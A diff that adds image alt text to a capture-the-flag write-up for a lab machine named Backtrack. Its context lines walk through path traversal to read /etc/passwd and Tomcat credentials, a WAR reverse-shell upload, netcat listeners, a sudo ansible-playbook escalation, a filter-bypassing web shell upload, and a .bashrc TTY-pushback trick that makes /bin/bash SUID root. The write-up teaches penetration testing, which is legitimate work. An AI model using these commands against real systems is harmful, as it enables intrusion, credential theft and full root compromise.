@@ -28,15 +28,15 @@ I performed an **nmap** aggressive scan on the target and found a bunch of open 
 nmap -A -p- TARGET --min-rate 10000 -oN backtrack.nmap
 ```
 
-![](https://cdn.ziomsec.com/backtrack/1.webp)
+![perfomring an nmap scan on backtrack machine](https://cdn.ziomsec.com/backtrack/1.webp)
 
 ## Initial Foothold
 
 I found a **tomcat** landing page on port 8080 a service called *Aria 2 WebUI* running on port 8888.
 
-![](https://cdn.ziomsec.com/backtrack/2.webp)
+![accessing the tomcat application](https://cdn.ziomsec.com/backtrack/2.webp)
 
-![](https://cdn.ziomsec.com/backtrack/3.webp)
+![accessing the web app running on 8888](https://cdn.ziomsec.com/backtrack/3.webp)
 
 A simple google search about *Aria 2 WebUI* revealed a path traversal vulnerability in it.
 - https://security.snyk.io/vuln/SNYK-JS-WEBUIARIA2-6322148
@@ -47,7 +47,7 @@ I was able to read local files using this. The `/etc/passwd` file revealed the u
 curl --path-as-is http://TARGET:8888/../../../../../../../../etc/passwd -s | grep "/bin/bash"
 ```
 
-![](https://cdn.ziomsec.com/backtrack/4.webp)
+![exploiting lfi](https://cdn.ziomsec.com/backtrack/4.webp)
 
 I then found the path of the **Tomcat** configuration file and read it. This file revealed the username and password for the tomcat manager.
 
@@ -55,11 +55,11 @@ I then found the path of the **Tomcat** configuration file and read it. This fil
 curl --path-as-is http://TARGET:8888/../../../../../../../../opt/tomcat/conf/tomcat-users.xml
 ```
 
-![](https://cdn.ziomsec.com/backtrack/5.webp)
+![exploiting lfi](https://cdn.ziomsec.com/backtrack/5.webp)
 
 However, when I tried accessing the manager panel using the credentials, it did not work. I was able to access the *Server-Status* endpoint which meant that the credentials were indeed valid.
 
-![](https://cdn.ziomsec.com/backtrack/6.webp)
+![accessing server status endpoint](https://cdn.ziomsec.com/backtrack/6.webp)
 
 I referred to the following articles:
 - https://www.hackingarticles.in/tomcat-penetration-testing/
@@ -78,13 +78,13 @@ curl --upload-file revshell.war 'http://tomcat:OPx52k53D80kTZpx4fr@TARGET:8080/m
 curl http://TARGET:8080/revshell/
 ```
 
-![](https://cdn.ziomsec.com/backtrack/7.webp)
+![uploading war payload](https://cdn.ziomsec.com/backtrack/7.webp)
 
 ```shell
 rlwrap nc -lnvp 80
 ```
 
-![](https://cdn.ziomsec.com/backtrack/8.webp)
+![getting a reverse shell](https://cdn.ziomsec.com/backtrack/8.webp)
 
 I got a shell as **tomcat**, but did not have the permissions to access the contents inside the other user directories. I switched back to my home directory and found the first flag.
 
@@ -92,7 +92,7 @@ I got a shell as **tomcat**, but did not have the permissions to access the cont
 cat /opt/tomcat/flag1.txt
 ```
 
-![](https://cdn.ziomsec.com/backtrack/9.webp)
+![capturing the first flag](https://cdn.ziomsec.com/backtrack/9.webp)
 
 ## Lateral Movement
 
@@ -102,7 +102,7 @@ I listed my **sudo** privileges and found that I could run a binary on a bunch o
 sudo -l
 ```
 
-![](https://cdn.ziomsec.com/backtrack/10.webp)
+![listing sudo privileges](https://cdn.ziomsec.com/backtrack/10.webp)
 
 **GTFOBins** had a way to exploit this to escalate privilege.
 - https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo
@@ -116,10 +116,10 @@ sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbook/../../../../../tmp/s
 
 ```
 
-![](https://cdn.ziomsec.com/backtrack/11.webp)
+![exploiting the vulnerability](https://cdn.ziomsec.com/backtrack/11.webp)
 > note: I used backtracks to point to the new **yml** file that I had created.
 
-![](https://cdn.ziomsec.com/backtrack/12.webp)
+![gaining access as wilbur](https://cdn.ziomsec.com/backtrack/12.webp)
 
 I spawned an interactive **bash** shell.
 
@@ -130,7 +130,7 @@ export TERM=xterm
 
 After getting shell access as **wilbur**, I read the contents inside the home directory and found a note that contained the credentials of **orville** for a custom web app that was running locally.
 
-![](https://cdn.ziomsec.com/backtrack/13.webp)
+![spawning interactive shell](https://cdn.ziomsec.com/backtrack/13.webp)
 
 I listed the active ports and found port **80** on listening state.
 
@@ -138,11 +138,11 @@ I listed the active ports and found port **80** on listening state.
 netstat -antp
 ```
 
-![](https://cdn.ziomsec.com/backtrack/14.webp)
+![listing active ports](https://cdn.ziomsec.com/backtrack/14.webp)
 
 I also found my credentials in a hidden file called *`.just_in_case.txt`*
 
-![](https://cdn.ziomsec.com/backtrack/15.webp)
+![viewing wilbur's password](https://cdn.ziomsec.com/backtrack/15.webp)
 
 I then connected to the target using these credentials to get a better shell.
 
@@ -158,31 +158,31 @@ ssh -L 80:127.0.0.1:80 wilbur@TARGET
 
 I then accessed the web application through my browser.
 
-![](https://cdn.ziomsec.com/backtrack/16.webp)
+![accessing internal application](https://cdn.ziomsec.com/backtrack/16.webp)
 
 I accessed the login panel and logged in using the credentials that I had discovered earlier.
 
-![](https://cdn.ziomsec.com/backtrack/17.webp)
+![logging into internal application](https://cdn.ziomsec.com/backtrack/17.webp)
 
 I tried uploading a reverse shell but failed to do so due to file type restrictions.
 
-![](https://cdn.ziomsec.com/backtrack/18.webp)
+![attempting to upload a reverse shell](https://cdn.ziomsec.com/backtrack/18.webp)
 
 I then created a simple web shell and tried various bypass techniques and finally managed to upload the file using **double extensions** ( `shell.png.php` ).
 
-![](https://cdn.ziomsec.com/backtrack/19.webp)
+![uploading a file with double extension](https://cdn.ziomsec.com/backtrack/19.webp)
 
 I then tried executing a command but failed.
 
-![](https://cdn.ziomsec.com/backtrack/20.webp)
+![attempting to execute command](https://cdn.ziomsec.com/backtrack/20.webp)
 
 I tried uploading the file outside it's intended directory.
 
-![](https://cdn.ziomsec.com/backtrack/21.webp)
+![uploading file outside the directory](https://cdn.ziomsec.com/backtrack/21.webp)
 
 However, it did not work. **Double URL encoding** the backtracks bypassed the restrictions and allowed me to upload the file outside the *uploads* directory.
 
-![](https://cdn.ziomsec.com/backtrack/22.webp)
+![uploading file outside the directory](https://cdn.ziomsec.com/backtrack/22.webp)
 
 Finally, I was able to execute commands. I then used **nc** to get a reverse shell from the target.
 
@@ -196,7 +196,7 @@ Since the application was running as **orville**, I got a shell as that user.
 rlwrap nc -lnvp 1337
 ```
 
-![](https://cdn.ziomsec.com/backtrack/23.webp)
+![getting a reverse shell as orville](https://cdn.ziomsec.com/backtrack/23.webp)
 
 I then captured the second flag from the home directory.
 
@@ -204,13 +204,13 @@ I then captured the second flag from the home directory.
 cat /home/orville/flag2.txt
 ```
 
-![](https://cdn.ziomsec.com/backtrack/24.webp)
+![capturing the second flag](https://cdn.ziomsec.com/backtrack/24.webp)
 
 ## Privilege Escalation
 
 There was a zip file so I transferred it on my local system. When I uncompressed the file, I realized it was only a backup of the web application.
 
-![](https://cdn.ziomsec.com/backtrack/25.webp)
+![inspecting the zip archive on personal system](https://cdn.ziomsec.com/backtrack/25.webp)
 
 I did not find anything useful on the target. One thing that I noticed when I uncompressed the backup was that it contained the malicious **php** file that I had uploaded to get a shell as **orville**. This meant that the backups were being made periodically. 
 
@@ -226,7 +226,7 @@ chmod +x pspy64
 
 Multiple commands were being executed as root and then the user was changed to **orville**.
 
-![](https://cdn.ziomsec.com/backtrack/26.webp)
+![running pspy](https://cdn.ziomsec.com/backtrack/26.webp)
 
 When root switched to **Orville** using the command `su - orville`, it created a new shell for orville. The `-` in the command basically acts like a full login for **Orville**.
 
@@ -255,7 +255,7 @@ I then added the command to execute this in the **`.bashrc`** file so that it co
 echo 'python3 /home/orville/evil.py' >> .bashrc
 ```
 
-![](https://cdn.ziomsec.com/backtrack/27.webp)
+![performing privesc using tty pushback](https://cdn.ziomsec.com/backtrack/27.webp)
 
 After some time, an SUID bit was added to the `/bin/bash` binary.
 
@@ -263,7 +263,7 @@ After some time, an SUID bit was added to the `/bin/bash` binary.
 ls -la /bin/bash
 ```
 
-![](https://cdn.ziomsec.com/backtrack/28.webp)
+![verifying the exploit worked](https://cdn.ziomsec.com/backtrack/28.webp)
 
 Finally, I executed **bash** in privileged mode and got root access.
 
@@ -271,7 +271,7 @@ Finally, I executed **bash** in privileged mode and got root access.
 /bin/bash -p
 ```
 
-![](https://cdn.ziomsec.com/backtrack/29.webp)
+![spawning shell as root](https://cdn.ziomsec.com/backtrack/29.webp)
 
 I then captured the final flag from root user's home directory.
 
@@ -279,7 +279,7 @@ I then captured the final flag from root user's home directory.
 cat /root/flag3.txt
 ```
 
-![](https://cdn.ziomsec.com/backtrack/30.webp)
+![capturing the root flag](https://cdn.ziomsec.com/backtrack/30.webp)
 
 I also found the root credentials inside the **manage.py** file present in the `/root` directory.
 
@@ -287,7 +287,7 @@ I also found the root credentials inside the **manage.py** file present in the `
 cat /root/manage.py
 ```
 
-![](https://cdn.ziomsec.com/backtrack/31.webp)
+![viewing root credentials](https://cdn.ziomsec.com/backtrack/31.webp)
 
 That's it from my side!
 Until next time :)
